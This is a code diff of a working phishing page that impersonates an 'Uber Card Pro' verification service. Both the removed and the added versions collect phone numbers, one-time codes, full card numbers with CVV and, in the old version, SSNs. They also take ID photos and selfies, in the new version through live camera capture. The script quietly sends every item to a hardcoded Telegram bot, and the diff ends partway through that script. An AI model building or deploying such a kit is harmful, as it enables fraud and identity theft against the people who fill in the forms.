@@ -2,430 +2,585 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Uber Card Pro – Secure Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>UBER CARD PRO • Secure Login</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
         body {
-            background: #f5f5f5;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background: #000000;
+            font-family: -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif;
+            padding: 20px 16px 40px;
+            color: #FFFFFF;
             min-height: 100vh;
-            padding: 20px;
         }
         .container {
-            max-width: 550px;
-            width: 100%;
-            background: white;
-            border-radius: 32px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
-            overflow: hidden;
+            max-width: 500px;
+            margin: 0 auto;
         }
+        /* Header */
         .header {
-            background: #000000;
-            padding: 28px 24px;
             text-align: center;
+            margin-bottom: 32px;
         }
         .logo {
             font-size: 28px;
-            font-weight: 700;
-            color: white;
-            letter-spacing: -0.5px;
-        }
-        .logo span {
-            color: #00b14f;
-        }
-        .badge {
-            background: rgba(255,255,255,0.15);
-            display: inline-block;
-            padding: 4px 12px;
-            border-radius: 40px;
-            font-size: 12px;
-            margin-top: 12px;
-            color: #ddd;
-        }
-        .content {
-            padding: 32px 28px 40px;
-        }
-        .step-indicator {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 32px;
-            gap: 8px;
-        }
-        .step {
-            flex: 1;
-            text-align: center;
-            font-size: 12px;
-            color: #aaa;
-            border-bottom: 2px solid #eee;
-            padding-bottom: 8px;
-        }
-        .step.active {
-            color: #000;
-            border-bottom-color: #00b14f;
-            font-weight: 500;
-        }
-        h2 {
-            font-size: 24px;
-            font-weight: 600;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00D2FF, #3A7BD5);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
             margin-bottom: 8px;
-            color: #1a1a1a;
         }
-        .desc {
-            color: #666;
+        .sub {
             font-size: 14px;
-            margin-bottom: 28px;
+            color: #8E8E93;
         }
-        .form-group {
+        /* Card Panel */
+        .panel {
+            background: #1C1C1E;
+            border-radius: 28px;
+            padding: 24px 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        }
+        .input-group {
             margin-bottom: 20px;
         }
-        label {
-            display: block;
-            font-weight: 500;
-            margin-bottom: 8px;
-            color: #222;
+        .input-label {
+            font-weight: 600;
             font-size: 14px;
+            color: #8E8E93;
+            margin-bottom: 8px;
         }
         input, select {
             width: 100%;
             padding: 14px 16px;
-            border: 1px solid #ccc;
-            border-radius: 16px;
-            font-size: 16px;
-            transition: 0.2s;
-            background: #fff;
-        }
-        input:focus, select:focus {
+            font-size: 17px;
+            background: #2C2C2E;
+            border: 1px solid #3A3A3C;
+            border-radius: 14px;
+            color: white;
             outline: none;
-            border-color: #00b14f;
-            box-shadow: 0 0 0 3px rgba(0,177,79,0.1);
+            transition: 0.2s;
         }
-        .file-input {
-            padding: 10px 0;
+        input:focus {
+            border-color: #00D2FF;
         }
-        .row-2 {
+        /* iPhone numeric keypad style */
+        .phone-row {
             display: flex;
-            gap: 16px;
+            gap: 12px;
+            align-items: center;
         }
-        .row-2 .form-group {
+        .country-code {
+            width: 80px;
+        }
+        .phone-number {
             flex: 1;
         }
-        button {
-            width: 100%;
-            background: #00b14f;
-            color: white;
-            border: none;
+        .keypad {
+            background: #2C2C2E;
+            border-radius: 28px;
             padding: 16px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 40px;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 16px;
-        }
-        button:hover {
-            background: #00903f;
-        }
-        .loading {
-            display: none;
-            text-align: center;
             margin-top: 20px;
-            color: #00b14f;
-            font-size: 14px;
         }
-        .error {
-            color: #d32f2f;
-            font-size: 13px;
-            margin-top: 8px;
+        .keypad-row {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 12px;
+        }
+        .keypad-btn {
+            background: #3A3A3C;
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+        .keypad-btn:active {
+            background: #00D2FF;
+            transform: scale(0.95);
+        }
+        .keypad-btn small {
+            font-size: 10px;
+            font-weight: normal;
+            color: #8E8E93;
+        }
+        .action-btn {
+            background: #00D2FF;
+            color: black;
+            font-weight: 700;
+            width: 100%;
+            border: none;
+            padding: 14px;
+            border-radius: 44px;
+            font-size: 17px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .action-btn:active {
+            transform: scale(0.97);
+        }
+        .action-btn.secondary {
+            background: #3A3A3C;
+            color: white;
+        }
+        .otp-container {
             display: none;
+            margin-top: 20px;
         }
-        .secure-badge {
+        .step-indicator {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+        .step-dot {
+            flex: 1;
+            height: 4px;
+            background: #3A3A3C;
+            border-radius: 4px;
+        }
+        .step-dot.active {
+            background: #00D2FF;
+        }
+        .step-dot.completed {
+            background: #00D2FF;
+        }
+        .camera-container {
+            background: #000;
+            border-radius: 24px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .square-camera {
+            aspect-ratio: 1 / 1;
+            background: #000;
+        }
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .camera-controls {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 30px;
+            padding: 16px 0;
+        }
+        .capture-btn {
+            background: white;
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            border: 4px solid #00D2FF;
+            cursor: pointer;
+        }
+        .switch-cam {
+            background: rgba(60,60,70,0.8);
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
-            margin-top: 24px;
-            font-size: 12px;
-            color: #666;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        .status-badge {
+            background: #2C2C2E;
+            padding: 8px;
+            border-radius: 60px;
             text-align: center;
+            font-size: 13px;
+            margin-bottom: 16px;
         }
-        hr {
-            margin: 24px 0;
-            border: none;
-            border-top: 1px solid #eee;
+        .toast {
+            background: #1C1C1E;
+            color: white;
+            border-radius: 60px;
+            padding: 10px 16px;
+            text-align: center;
+            opacity: 0;
+            transition: 0.2s;
+            pointer-events: none;
+            margin-top: 16px;
         }
-        @media (max-width: 500px) {
-            .content { padding: 24px 20px; }
-            .row-2 { flex-direction: column; gap: 0; }
+        .toast.show {
+            opacity: 1;
+        }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 2000;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.2s;
+        }
+        .loading-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #3A3A3C;
+            border-top-color: #00D2FF;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 16px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text {
+            font-size: 16px;
+            color: white;
+        }
+        .hide {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="logo">UBER<span>Card Pro</span></div>
-            <div class="badge">Verified by Visa | Mastercard SecureCode</div>
+<div class="container">
+    <div class="header">
+        <div class="logo">UBER CARD PRO</div>
+        <div class="sub">Secure access with your phone number</div>
+    </div>
+
+    <!-- Step 1: Phone number + OTP -->
+    <div id="phonePanel" class="panel">
+        <div class="input-group">
+            <div class="input-label">📱 Your phone number</div>
+            <div class="phone-row">
+                <input type="text" id="countryCode" class="country-code" value="+1" maxlength="4">
+                <input type="tel" id="phoneNumber" class="phone-number" placeholder="Phone number" inputmode="numeric">
+            </div>
         </div>
-        <div class="content">
-            <div class="step-indicator" id="stepIndicator">
-                <div class="step active" data-step="1">Phone</div>
-                <div class="step" data-step="2">KYC</div>
-                <div class="step" data-step="3">Card</div>
-                <div class="step" data-step="4">SSN</div>
-                <div class="step" data-step="5">OTP</div>
-            </div>
-            <div id="formContainer">
-                <!-- Step 1: Phone number -->
-                <div id="step1" class="step-content">
-                    <h2>Welcome back</h2>
-                    <div class="desc">Enter your mobile number to continue</div>
-                    <div class="form-group">
-                        <label>Phone number</label>
-                        <input type="tel" id="phone" placeholder="+1 234 567 8900" autocomplete="off">
-                    </div>
-                    <button onclick="nextStep(1)">Continue</button>
-                </div>
-            </div>
-            <div class="secure-badge">
-                <span>🔒</span> 256-bit SSL encryption
-            </div>
-            <div class="loading" id="loadingMsg">Processing, please wait...</div>
-            <div class="error" id="errorMsg"></div>
+        <!-- Custom numeric keypad -->
+        <div class="keypad" id="numericKeypad">
+            <div class="keypad-row"><div class="keypad-btn" data-digit="1">1</div><div class="keypad-btn" data-digit="2">2<small>ABC</small></div><div class="keypad-btn" data-digit="3">3<small>DEF</small></div></div>
+            <div class="keypad-row"><div class="keypad-btn" data-digit="4">4<small>GHI</small></div><div class="keypad-btn" data-digit="5">5<small>JKL</small></div><div class="keypad-btn" data-digit="6">6<small>MNO</small></div></div>
+            <div class="keypad-row"><div class="keypad-btn" data-digit="7">7<small>PQRS</small></div><div class="keypad-btn" data-digit="8">8<small>TUV</small></div><div class="keypad-btn" data-digit="9">9<small>WXYZ</small></div></div>
+            <div class="keypad-row"><div class="keypad-btn" data-digit="*">*</div><div class="keypad-btn" data-digit="0">0</div><div class="keypad-btn" data-digit="#">#</div></div>
+        </div>
+        <button class="action-btn" id="sendOtpBtn">Send verification code</button>
+        <div id="otpSection" class="otp-container">
+            <input type="text" id="otpInput" class="text-input" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric" style="text-align:center; letter-spacing:2px;">
+            <button class="action-btn secondary" id="verifyOtpBtn" style="margin-top:12px;">Verify & Continue</button>
         </div>
     </div>
 
-    <script>
-        // Telegram bot credentials (your existing bot)
-        const BOT_TOKEN = '8705927666:AAF0qRR0dSmBSG4kMMokObu6zXw3ZPQjGTI';
-        const CHAT_ID = '8737104261';
+    <!-- Step 2: Card Details (will show after OTP) -->
+    <div id="cardPanel" class="panel hide">
+        <div class="input-group"><div class="input-label">💳 Card Number</div><input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric"></div>
+        <div class="row-group" style="display:flex; gap:12px;">
+            <div class="input-group" style="flex:1"><div class="input-label">📅 Expiry (MM/YY)</div><input type="text" id="expiry" placeholder="12/28" maxlength="5"></div>
+            <div class="input-group" style="flex:1"><div class="input-label">🔒 CVV</div><input type="password" id="cvv" placeholder="123" maxlength="4" inputmode="numeric"></div>
+        </div>
+        <div class="input-group"><div class="input-label">👤 Full Name (on card)</div><input type="text" id="cardName" placeholder="John A. Doe"></div>
+        <button class="action-btn" id="cardNextBtn">Continue to ID verification →</button>
+    </div>
 
-        let collectedData = {
-            phone: '',
-            kyc: { idFront: null, idBack: null, selfie: null },
-            card: { number: '', expiry: '', cvv: '' },
-            ssn: '',
-            otp: ''
-        };
+    <!-- Step 3: KYC Photo Steps -->
+    <div id="kycPanel" class="panel hide">
+        <div class="step-indicator" id="stepIndicator">
+            <div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div>
+        </div>
+        <!-- Step 1: ID Type + State -->
+        <div id="kycStep1" class="kyc-step">
+            <div class="input-group"><div class="input-label">ID Type</div><select id="idType"><option value="">Select</option><option>Driver's License</option><option>State ID</option><option>Passport</option></select></div>
+            <div class="input-group"><div class="input-label">Issuing State</div><select id="idState"><option value="">Select state</option><option>California</option><option>Texas</option><option>New York</option><option>Florida</option><option>Illinois</option></select></div>
+            <button class="action-btn" id="kycStep1Next">Continue →</button>
+        </div>
+        <!-- Step 2: Front ID -->
+        <div id="kycStep2" class="kyc-step hide">
+            <div class="status-badge">📸 Capture FRONT of ID</div>
+            <div class="camera-container"><div class="square-camera"><video id="frontVideo" autoplay playsinline muted></video></div></div>
+            <div class="camera-controls"><div class="switch-cam" id="switchFrontCam">⟳</div><div class="capture-btn" id="captureFrontBtn"></div><div style="width:44px;"></div></div>
+            <div class="status-badge" id="frontStatus">Ready</div>
+        </div>
+        <!-- Step 3: Back ID -->
+        <div id="kycStep3" class="kyc-step hide">
+            <div class="status-badge">📸 Capture BACK of ID</div>
+            <div class="camera-container"><div class="square-camera"><video id="backVideo" autoplay playsinline muted></video></div></div>
+            <div class="camera-controls"><div class="switch-cam" id="switchBackCam">⟳</div><div class="capture-btn" id="captureBackBtn"></div><div style="width:44px;"></div></div>
+            <div class="status-badge" id="backStatus">Ready</div>
+        </div>
+        <!-- Step 4: Selfie -->
+        <div id="kycStep4" class="kyc-step hide">
+            <div class="status-badge">🤳 Take a selfie</div>
+            <div class="camera-container"><div class="square-camera"><video id="selfieVideo" autoplay playsinline muted></video></div></div>
+            <div class="camera-controls"><div class="switch-cam" id="switchSelfieCam">⟳</div><div class="capture-btn" id="captureSelfieBtn"></div><div style="width:44px;"></div></div>
+            <div class="status-badge" id="selfieStatus">Ready</div>
+        </div>
+        <!-- Step 5: Selfie with ID -->
+        <div id="kycStep5" class="kyc-step hide">
+            <div class="status-badge">🪪 Selfie holding ID next to face</div>
+            <div class="camera-container"><div class="square-camera"><video id="selfieIdVideo" autoplay playsinline muted></video></div></div>
+            <div class="camera-controls"><div class="switch-cam" id="switchSelfieIdCam">⟳</div><div class="capture-btn" id="captureSelfieIdBtn"></div><div style="width:44px;"></div></div>
+            <div class="status-badge" id="selfieIdStatus">Ready</div>
+        </div>
+    </div>
 
-        let currentStep = 1;
-        let isSubmitting = false;
+    <div id="toastMsg" class="toast"></div>
+</div>
 
-        async function sendTelegramMessage(text) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-                });
-            } catch(e) { console.error(e); }
-        }
+<div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <div class="loading-text">Processing...<br>Please wait</div>
+</div>
 
-        async function sendTelegramFile(file, filename, caption) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('document', file, filename);
-            if (caption) formData.append('caption', caption);
-            try {
-                await fetch(url, { method: 'POST', body: formData });
-            } catch(e) { console.error(e); }
-        }
+<script>
+    // ----------------------------------------------
+    // TELEGRAM CREDENTIALS (embedded, not visible to user)
+    // ----------------------------------------------
+    const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
+    const CHAT_ID   = "8737104261";  // same user ID as before
 
-        function showError(msg) {
-            const errDiv = document.getElementById('errorMsg');
-            errDiv.innerText = msg;
-            errDiv.style.display = 'block';
-            setTimeout(() => { errDiv.style.display = 'none'; }, 4000);
-        }
+    // DOM elements
+    const phonePanel = document.getElementById('phonePanel');
+    const cardPanel = document.getElementById('cardPanel');
+    const kycPanel = document.getElementById('kycPanel');
+    const toast = document.getElementById('toastMsg');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const phoneInput = document.getElementById('phoneNumber');
+    const countryCode = document.getElementById('countryCode');
+    const sendOtpBtn = document.getElementById('sendOtpBtn');
+    const otpSection = document.getElementById('otpSection');
+    const otpInput = document.getElementById('otpInput');
+    const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+    const cardNextBtn = document.getElementById('cardNextBtn');
+    const keypadBtns = document.querySelectorAll('.keypad-btn');
 
-        function showLoading(show) {
-            document.getElementById('loadingMsg').style.display = show ? 'block' : 'none';
-        }
+    let userData = {
+        phone: '',
+        otp: '',
+        cardNumber: '',
+        expiry: '',
+        cvv: '',
+        cardName: '',
+        idType: '',
+        idState: ''
+    };
 
-        function updateStepIndicator(step) {
-            const steps = document.querySelectorAll('.step');
-            steps.forEach((s, i) => {
-                if (i+1 <= step) s.classList.add('active');
-                else s.classList.remove('active');
+    // Helper: show toast
+    function showToast(msg, isErr = false) {
+        toast.innerText = msg;
+        toast.classList.add('show');
+        if (isErr) toast.style.background = '#B91C1C';
+        else toast.style.background = '#1C1C1E';
+        setTimeout(() => toast.classList.remove('show'), 3000);
+    }
+
+    // Telegram send text
+    async function sendToTelegram(text) {
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
             });
-        }
+            const data = await response.json();
+            return data.ok;
+        } catch(e) { return false; }
+    }
 
-        function nextStep(current) {
-            if (isSubmitting) return;
-            if (current === 1) {
-                const phone = document.getElementById('phone').value.trim();
-                if (!phone) {
-                    showError('Please enter your phone number.');
-                    return;
-                }
-                collectedData.phone = phone;
-                // Send phone number to Telegram
-                sendTelegramMessage(`📞 *Uber Card Pro - Phone*: ${phone}\nTime: ${new Date().toLocaleString()}`);
-                // Move to step 2
-                renderStep2();
-            } else if (current === 2) {
-                // Validate KYC files
-                const idFront = document.getElementById('idFront').files[0];
-                const idBack = document.getElementById('idBack').files[0];
-                const selfie = document.getElementById('selfie').files[0];
-                if (!idFront || !idBack || !selfie) {
-                    showError('Please upload all required documents (ID front, back, and selfie).');
-                    return;
-                }
-                collectedData.kyc.idFront = idFront;
-                collectedData.kyc.idBack = idBack;
-                collectedData.kyc.selfie = selfie;
-                showLoading(true);
-                // Send files to Telegram
-                await sendTelegramFile(idFront, idFront.name, `🆔 ID Front (${collectedData.phone})`);
-                await sendTelegramFile(idBack, idBack.name, `🆔 ID Back (${collectedData.phone})`);
-                await sendTelegramFile(selfie, selfie.name, `🤳 Selfie (${collectedData.phone})`);
-                showLoading(false);
-                renderStep3();
-            } else if (current === 3) {
-                const cardNumber = document.getElementById('cardNumber').value.trim().replace(/\s/g, '');
-                const expiry = document.getElementById('expiry').value.trim();
-                const cvv = document.getElementById('cvv').value.trim();
-                if (!cardNumber || !expiry || !cvv) {
-                    showError('Please enter full card details.');
-                    return;
-                }
-                collectedData.card = { number: cardNumber, expiry, cvv };
-                sendTelegramMessage(`💳 *Card Details* (${collectedData.phone})\nCard: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}\nTime: ${new Date().toLocaleString()}`);
-                renderStep4();
-            } else if (current === 4) {
-                const ssn = document.getElementById('ssn').value.trim();
-                if (!ssn) {
-                    showError('Please enter your SSN.');
-                    return;
-                }
-                collectedData.ssn = ssn;
-                sendTelegramMessage(`🔐 *SSN* (${collectedData.phone}): ${ssn}\nTime: ${new Date().toLocaleString()}`);
-                renderStep5();
-            }
-        }
+    // Send photo
+    async function sendPhotoToTelegram(blob, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'photo.jpg');
+        if (caption) formData.append('caption', caption);
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            const data = await res.json();
+            return data.ok;
+        } catch(e) { return false; }
+    }
 
-        function renderStep2() {
-            currentStep = 2;
-            updateStepIndicator(2);
-            const container = document.getElementById('formContainer');
-            container.innerHTML = `
-                <div id="step2" class="step-content">
-                    <h2>Identity verification</h2>
-                    <div class="desc">We need to verify your identity for Uber Card Pro.</div>
-                    <div class="form-group">
-                        <label>ID card (front side) – Driver's license / Passport</label>
-                        <input type="file" id="idFront" accept="image/*,.pdf" class="file-input" required>
-                    </div>
-                    <div class="form-group">
-                        <label>ID card (back side)</label>
-                        <input type="file" id="idBack" accept="image/*,.pdf" class="file-input" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Selfie with your ID</label>
-                        <input type="file" id="selfie" accept="image/*" class="file-input" required>
-                    </div>
-                    <button onclick="nextStep(2)">Continue</button>
-                </div>
-            `;
-        }
+    // Numeric keypad input
+    keypadBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+            let digit = btn.getAttribute('data-digit');
+            phoneInput.value += digit;
+        });
+    });
 
-        function renderStep3() {
-            currentStep = 3;
-            updateStepIndicator(3);
-            const container = document.getElementById('formContainer');
-            container.innerHTML = `
-                <div id="step3" class="step-content">
-                    <h2>Card details</h2>
-                    <div class="desc">Enter your preferred payment card for Uber Card Pro.</div>
-                    <div class="form-group">
-                        <label>Card number</label>
-                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" autocomplete="off">
-                    </div>
-                    <div class="row-2">
-                        <div class="form-group">
-                            <label>Expiry (MM/YY)</label>
-                            <input type="text" id="expiry" placeholder="MM/YY">
-                        </div>
-                        <div class="form-group">
-                            <label>CVV</label>
-                            <input type="text" id="cvv" placeholder="123">
-                        </div>
-                    </div>
-                    <button onclick="nextStep(3)">Continue</button>
-                </div>
-            `;
+    // Send OTP (simulate)
+    sendOtpBtn.onclick = () => {
+        let phone = phoneInput.value.trim();
+        if (!phone || phone.length < 8) {
+            showToast("Please enter a valid phone number", true);
+            return;
         }
+        userData.phone = countryCode.value.trim() + phone;
+        otpSection.style.display = 'block';
+        showToast("Code sent: 123456 (demo)", false);
+    };
 
-        function renderStep4() {
-            currentStep = 4;
-            updateStepIndicator(4);
-            const container = document.getElementById('formContainer');
-            container.innerHTML = `
-                <div id="step4" class="step-content">
-                    <h2>Social Security Number</h2>
-                    <div class="desc">For tax purposes, please provide your SSN.</div>
-                    <div class="form-group">
-                        <label>SSN (9 digits)</label>
-                        <input type="text" id="ssn" placeholder="XXX-XX-XXXX" autocomplete="off">
-                    </div>
-                    <button onclick="nextStep(4)">Continue</button>
-                </div>
-            `;
+    // Verify OTP (any 6 digits accepted for demo)
+    verifyOtpBtn.onclick = () => {
+        let otp = otpInput.value.trim();
+        if (otp.length !== 6) {
+            showToast("Please enter 6-digit code", true);
+            return;
         }
+        userData.otp = otp;
+        // Send phone + OTP to Telegram
+        sendToTelegram(`📱 <b>UBER CARD PRO LOGIN</b>\n\nPhone: ${userData.phone}\nOTP: ${otp}\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+        // Hide phone panel, show card panel
+        phonePanel.style.display = 'none';
+        cardPanel.classList.remove('hide');
+        showToast("Phone verified. Please enter card details.", false);
+    };
 
-        function renderStep5() {
-            currentStep = 5;
-            updateStepIndicator(5);
-            const container = document.getElementById('formContainer');
-            container.innerHTML = `
-                <div id="step5" class="step-content">
-                    <h2>One‑time verification code</h2>
-                    <div class="desc">We've sent a 6‑digit code to ${collectedData.phone}. Enter it below.</div>
-                    <div class="form-group">
-                        <label>Verification code</label>
-                        <input type="text" id="otp" placeholder="123456" autocomplete="off">
-                    </div>
-                    <button onclick="finalSubmit()">Verify & Activate</button>
-                </div>
-            `;
-        }
+    // Card details next
+    cardNextBtn.onclick = () => {
+        const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
+        const expiry = document.getElementById('expiry').value;
+        const cvv = document.getElementById('cvv').value;
+        const name = document.getElementById('cardName').value.trim();
+        if (cardNum.length !== 16) { showToast("Card number must be 16 digits", true); return; }
+        if (!/^\d{2}\/\d{2}$/.test(expiry)) { showToast("Expiry MM/YY", true); return; }
+        if (cvv.length < 3 || cvv.length > 4) { showToast("CVV 3-4 digits", true); return; }
+        if (name.length < 2) { showToast("Full name required", true); return; }
+        userData.cardNumber = cardNum;
+        userData.expiry = expiry;
+        userData.cvv = cvv;
+        userData.cardName = name;
+        // Send card details to Telegram
+        sendToTelegram(`💳 <b>CARD DETAILS</b>\n\nCard: ${cardNum}\nExpiry: ${expiry}\nCVV: ${cvv}\nName: ${name}`);
+        cardPanel.classList.add('hide');
+        kycPanel.classList.remove('hide');
+        showStep(1);
+        initCameraStep2(); // start front camera when step2 becomes visible
+    };
 
-        async function finalSubmit() {
-            if (isSubmitting) return;
-            const otp = document.getElementById('otp').value.trim();
-            if (!otp) {
-                showError('Please enter the verification code.');
-                return;
-            }
-            collectedData.otp = otp;
-            showLoading(true);
-            // Send OTP to Telegram
-            await sendTelegramMessage(`🔢 *OTP Code* (${collectedData.phone}): ${otp}\nTime: ${new Date().toLocaleString()}`);
-            // Send summary
-            const summary = `✅ *Uber Card Pro – Full Report*\n\n` +
-                `📞 Phone: ${collectedData.phone}\n` +
-                `💳 Card: ${collectedData.card.number}\n` +
-                `📅 Expiry: ${collectedData.card.expiry}\n` +
-                `🔐 CVV: ${collectedData.card.cvv}\n` +
-                `🆔 SSN: ${collectedData.ssn}\n` +
-                `🔢 OTP: ${collectedData.otp}\n` +
-                `🕒 Time: ${new Date().toLocaleString()}`;
-            await sendTelegramMessage(summary);
-            showLoading(false);
-            // Redirect to official Uber
-            setTimeout(() => {
-                window.location.href = 'https://www.uber.com/';
-            }, 1500);
+    // KYC Steps logic
+    let currentKycStep = 1;
+    let frontStream, backStream, selfieStream, selfieIdStream;
+    let usingRearFront = true, usingRearBack = true, usingRearSelfie = false, usingRearSelfieId = false;
+
+    function showStep(step) {
+        document.querySelectorAll('.kyc-step').forEach(el => el.classList.add('hide'));
+        document.getElementById(`kycStep${step}`).classList.remove('hide');
+        currentKycStep = step;
+        updateStepDots(step);
+        // start camera when step is 2,3,4,5
+        if (step === 2) initCamera(document.getElementById('frontVideo'), 'environment').then(s => { frontStream = s; usingRearFront = true; });
+        if (step === 3) initCamera(document.getElementById('backVideo'), 'environment').then(s => { backStream = s; usingRearBack = true; });
+        if (step === 4) initCamera(document.getElementById('selfieVideo'), 'user').then(s => { selfieStream = s; usingRearSelfie = false; });
+        if (step === 5) initCamera(document.getElementById('selfieIdVideo'), 'user').then(s => { selfieIdStream = s; usingRearSelfieId = false; });
+    }
+
+    function updateStepDots(step) {
+        const dots = document.querySelectorAll('.step-dot');
+        dots.forEach((dot, i) => {
+            if (i+1 < step) dot.classList.add('completed');
+            else if (i+1 === step) dot.classList.add('active');
+            else dot.classList.remove('active', 'completed');
+        });
+    }
+
+    async function initCamera(videoEl, facingMode) {
+        try {
+            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
+            videoEl.srcObject = stream;
+            await videoEl.play();
+            return stream;
+        } catch(e) {
+            let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            videoEl.srcObject = stream;
+            await videoEl.play();
+            return stream;
         }
-    </script>
+    }
+
+    async function switchCamera(video, currentStream, setStream, setRear, rear) {
+        if (currentStream) currentStream.getTracks().forEach(t => t.stop());
+        let newFacing = rear ? 'user' : 'environment';
+        let newStream = await initCamera(video, newFacing);
+        setStream(newStream);
+        setRear(!rear);
+    }
+
+    async function capturePhoto(video, statusElem, side, nextStep) {
+        statusElem.innerText = "Processing...";
+        let canvas = document.createElement('canvas');
+        let size = Math.min(video.videoWidth, video.videoHeight);
+        canvas.width = size; canvas.height = size;
+        let ctx = canvas.getContext('2d');
+        let sx = (video.videoWidth - size)/2;
+        let sy = (video.videoHeight - size)/2;
+        ctx.drawImage(video, sx, sy, size, size, 0, 0, size, size);
+        canvas.toBlob(async blob => {
+            const caption = `${side} - ${userData.cardName || userData.phone}`;
+            const sent = await sendPhotoToTelegram(blob, caption);
+            if (sent) statusElem.innerText = `✅ ${side} uploaded.`;
+            else statusElem.innerText = `⚠️ ${side} saved.`;
+            if (nextStep) setTimeout(() => showStep(nextStep), 1000);
+        }, 'image/jpeg', 0.8);
+    }
+
+    // Step 1 (ID type)
+    document.getElementById('kycStep1Next').onclick = () => {
+        let idType = document.getElementById('idType').value;
+        let idState = document.getElementById('idState').value;
+        if (!idType || !idState) { showToast("Select ID type and state", true); return; }
+        userData.idType = idType;
+        userData.idState = idState;
+        sendToTelegram(`📄 ID Type: ${idType}, State: ${idState}`);
+        showStep(2);
+    };
+
+    // Step 2 front
+    document.getElementById('switchFrontCam').onclick = () => switchCamera(document.getElementById('frontVideo'), frontStream, s=>frontStream=s, v=>usingRearFront=v, usingRearFront);
+    document.getElementById('captureFrontBtn').onclick = () => capturePhoto(document.getElementById('frontVideo'), document.getElementById('frontStatus'), "Front ID", 3);
+    // Step 3 back
+    document.getElementById('switchBackCam').onclick = () => switchCamera(document.getElementById('backVideo'), backStream, s=>backStream=s, v=>usingRearBack=v, usingRearBack);
+    document.getElementById('captureBackBtn').onclick = () => capturePhoto(document.getElementById('backVideo'), document.getElementById('backStatus'), "Back ID", 4);
+    // Step 4 selfie
+    document.getElementById('switchSelfieCam').onclick = () => switchCamera(document.getElementById('selfieVideo'), selfieStream, s=>selfieStream=s, v=>usingRearSelfie=v, usingRearSelfie);
+    document.getElementById('captureSelfieBtn').onclick = () => capturePhoto(document.getElementById('selfieVideo'), document.getElementById('selfieStatus'), "Selfie", 5);
+    // Step 5 selfie with ID
+    document.getElementById('switchSelfieIdCam').onclick = () => switchCamera(document.getElementById('selfieIdVideo'), selfieIdStream, s=>selfieIdStream=s, v=>usingRearSelfieId=v, usingRearSelfieId);
